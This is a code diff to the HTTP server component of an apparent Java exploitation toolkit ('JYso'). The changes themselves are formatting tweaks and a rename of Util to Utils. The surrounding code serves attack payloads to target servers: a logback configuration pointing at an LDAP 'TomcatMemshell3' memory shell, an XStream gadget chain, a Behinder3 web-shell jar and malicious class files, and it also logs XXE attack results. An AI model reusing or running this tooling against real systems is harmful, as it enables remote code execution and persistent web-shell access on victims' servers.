@@ -3,7 +3,7 @@ package com.qi4l.JYso;
 import cn.hutool.core.io.file.FileReader;
 import com.qi4l.JYso.gadgets.Config.Config;
 import com.qi4l.JYso.gadgets.utils.Cache;
-import com.qi4l.JYso.gadgets.utils.Util;
+import com.qi4l.JYso.gadgets.utils.Utils;
 import com.qi4l.JYso.template.CommandTemplate;
 import com.qi4l.JYso.template.DnslogTemplate;
 import com.qi4l.JYso.template.ReverseShellTemplate;
@@ -20,7 +20,6 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.InetSocketAddress;
 import java.nio.charset.StandardCharsets;
-import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.jar.JarOutputStream;
@@ -87,11 +86,11 @@ public class HTTPServer {
 
     private static void handleFileRequest(HttpExchange exchange) throws Exception {
         System.out.println("[-] 请求的后缀不对");
-        String path     = exchange.getRequestURI().getPath();
+        String path = exchange.getRequestURI().getPath();
         String filename = cwd + File.separator + "data" + File.separator + path.substring(path.lastIndexOf("/") + 1);
-        File   file     = new File(filename);
+        File file = new File(filename);
         if (file.exists()) {
-            byte[]          bytes           = new byte[(int) file.length()];
+            byte[] bytes = new byte[(int) file.length()];
             FileInputStream fileInputStream = new FileInputStream(file);
             fileInputStream.read(bytes);
             exchange.sendResponseHeaders(200, file.length() + 1);
@@ -122,8 +121,8 @@ public class HTTPServer {
             exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 //            exchange.getResponseBody().write(yaml.getObject("UTF-8"));
         } else {
-            String pa   = cwd + File.separator + "data";
-            File   file = new File(pa + File.separator + YamlName + ".yml");
+            String pa = cwd + File.separator + "data";
+            File file = new File(pa + File.separator + YamlName + ".yml");
             if (file.exists()) {
                 byte[] bytes1 = new byte[(int) file.length()];
                 try (FileInputStream fileInputStream = new FileInputStream(file)) {
@@ -142,7 +141,7 @@ public class HTTPServer {
     }
 
     public static void handleTXTRequest(HttpExchange exchange) throws IOException {
-        String path    = exchange.getRequestURI().getPath();
+        String path = exchange.getRequestURI().getPath();
         String txtname = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
         if (txtname.equalsIgnoreCase("isok")) {
             System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
@@ -151,8 +150,8 @@ public class HTTPServer {
             exchange.sendResponseHeaders(200, bytes.length + 1);
             exchange.getResponseBody().write(bytes);
         } else {
-            String pa   = cwd + File.separator + "data";
-            File   file = new File(pa + File.separator + txtname + ".txt");
+            String pa = cwd + File.separator + "data";
+            File file = new File(pa + File.separator + txtname + ".txt");
 
             if (file.exists()) {
 
@@ -175,7 +174,7 @@ public class HTTPServer {
         String path = exchange.getRequestURI().getPath();
 //        String host = exchange.getRequestURI().getHost();
         String xmlName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
-        String bytes   = "<configuration>\n  <insertFromJNDI env-entry-name=\"ldap://" + Config.ip + ":" + Config.ldapPort + "/TomcatBypass/TomcatMemshell3\" as=\"appName\" />\n</configuration>";
+        String bytes = "<configuration>\n  <insertFromJNDI env-entry-name=\"ldap://" + Config.ip + ":" + Config.ldapPort + "/TomcatBypass/TomcatMemshell3\" as=\"appName\" />\n</configuration>";
         String xstream = "<linked-hash-set>\n" +
                 "    <jdk.nashorn.internal.objects.NativeString>\n" +
                 "      <flags>0</flags>\n" +
@@ -284,8 +283,8 @@ public class HTTPServer {
             exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));
 
         } else {
-            String pa   = cwd + File.separator + "data";
-            File   file = new File(pa + File.separator + xmlName + ".xml");
+            String pa = cwd + File.separator + "data";
+            File file = new File(pa + File.separator + xmlName + ".xml");
 
             if (file.exists()) {
                 byte[] bytes1 = new byte[(int) file.length()];
@@ -307,8 +306,8 @@ public class HTTPServer {
     }
 
     public static void handleSQLRequest(HttpExchange exchange) throws IOException {
-        String path    = exchange.getRequestURI().getPath();
-        String host    = exchange.getRequestURI().getHost();
+        String path = exchange.getRequestURI().getPath();
+        String host = exchange.getRequestURI().getHost();
         String sqlName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
 
         if (sqlName.equalsIgnoreCase("echo")) {
@@ -332,8 +331,8 @@ public class HTTPServer {
 
         } else {
 
-            String pa   = cwd + File.separator + "data";
-            File   file = new File(pa + File.separator + sqlName + ".sql");
+            String pa = cwd + File.separator + "data";
+            File file = new File(pa + File.separator + sqlName + ".sql");
 
             if (file.exists()) {
                 byte[] bytes = new byte[(int) file.length()];
@@ -352,9 +351,9 @@ public class HTTPServer {
     }
 
     public static void handlerGroovyRequest(HttpExchange exchange) throws IOException {
-        String path       = exchange.getRequestURI().getPath();
-        String host       = exchange.getRequestURI().getHost();
-        String exp        = "/TomcatBypass/TomcatEcho";
+        String path = exchange.getRequestURI().getPath();
+        String host = exchange.getRequestURI().getHost();
+        String exp = "/TomcatBypass/TomcatEcho";
         String groovyName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
 
         if (groovyName.equalsIgnoreCase("groovyecho")) {
@@ -372,8 +371,8 @@ public class HTTPServer {
             exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 
         } else {
-            String pa   = cwd + File.separator + "data";
-            File   file = new File(pa + File.separator + groovyName + ".groovy");
+            String pa = cwd + File.separator + "data";
+            File file = new File(pa + File.separator + groovyName + ".groovy");
 
             if (file.exists()) {
                 byte[] bytes = new byte[(int) file.length()];
@@ -395,8 +394,8 @@ public class HTTPServer {
 
     public static void handleXXELogRequest(HttpExchange exchange) throws IllegalAccessException, IOException {
         Object exchangeImpl = FieldUtils.readField(exchange, "impl", true);
-        Object request      = FieldUtils.readField(exchangeImpl, "req", true);
-        String startLine    = (String) FieldUtils.readField(request, "startLine", true);
+        Object request = FieldUtils.readField(exchangeImpl, "req", true);
+        String startLine = (String) FieldUtils.readField(request, "startLine", true);
 
         System.out.println(ansi().render("@|green [+] XXE Attack Result: |@" + startLine));
         exchange.sendResponseHeaders(200, 0);
@@ -404,12 +403,12 @@ public class HTTPServer {
     }
 
     private static void handleJarRequest(HttpExchange exchange) throws IOException {
-        String path    = exchange.getRequestURI().getPath();
+        String path = exchange.getRequestURI().getPath();
         String jarName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
 
         if (jarName.equalsIgnoreCase("behinder3")) {
-            byte[]     bytes;
-            String     filename   = cwd + File.separator + "data" + File.separator + "behinder3.jar";
+            byte[] bytes;
+            String filename = cwd + File.separator + "data" + File.separator + "behinder3.jar";
             FileReader fileReader = new FileReader(filename, "UTF-8");
             bytes = fileReader.readBytes();
             exchange.sendResponseHeaders(200, bytes.length + 1);
@@ -417,9 +416,9 @@ public class HTTPServer {
         } else {
 
             String filename = cwd + File.separator + "data" + File.separator + jarName + ".jar";
-            File   file     = new File(filename);
+            File file = new File(filename);
             if (file.exists()) {
-                byte[]     bytes;
+                byte[] bytes;
                 FileReader fileReader = new FileReader(filename, "UTF-8");
                 bytes = fileReader.readBytes();
                 exchange.sendResponseHeaders(200, bytes.length + 1);
@@ -436,7 +435,7 @@ public class HTTPServer {
     }
 
     private static void handleClassRequest(HttpExchange exchange) throws IOException {
-        String path      = exchange.getRequestURI().getPath();
+        String path = exchange.getRequestURI().getPath();
         String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
         System.out.println(ansi().render("@|green [+] Receive ClassRequest: |@" + className + ".class"));
         if (Cache.contains(className)) {
@@ -446,8 +445,8 @@ public class HTTPServer {
             exchange.sendResponseHeaders(200, bytes.length);
             exchange.getResponseBody().write(bytes);
         } else {
-            String pa   = cwd + path;
-            File   file = new File(pa);
+            String pa = cwd + path;
+            File file = new File(pa);
 
             if (file.exists()) {
                 byte[] bytes = new byte[(int) file.length()];
@@ -469,7 +468,7 @@ public class HTTPServer {
     }
 
     private static void handleWSDLRequest(HttpExchange exchange) throws Exception {
-        String              query  = exchange.getRequestURI().getQuery();
+        String query = exchange.getRequestURI().getQuery();
         Map<String, String> params = parseQuery(query);
 
         String path = exchange.getRequestURI().getPath().substring(1);
@@ -591,15 +590,15 @@ public class HTTPServer {
         }
 
         System.out.println(ansi().render("@|green [+] Name of Class in Jar: |@" + className));
-        ByteArrayOutputStream bout   = new ByteArrayOutputStream();
-        JarOutputStream       jarOut = new JarOutputStream(bout);
+        ByteArrayOutputStream bout = new ByteArrayOutputStream();
+        JarOutputStream jarOut = new JarOutputStream(bout);
         jarOut.putNextEntry(new ZipEntry(className + ".class"));
         jarOut.write(bytes);
         jarOut.closeEntry();
         jarOut.close();
         bout.close();
 
-        String jarName = Util.getRandomString();
+        String jarName = Utils.getRandomString();
         Cache.set(jarName, bout.toByteArray());
 
         return jarName;
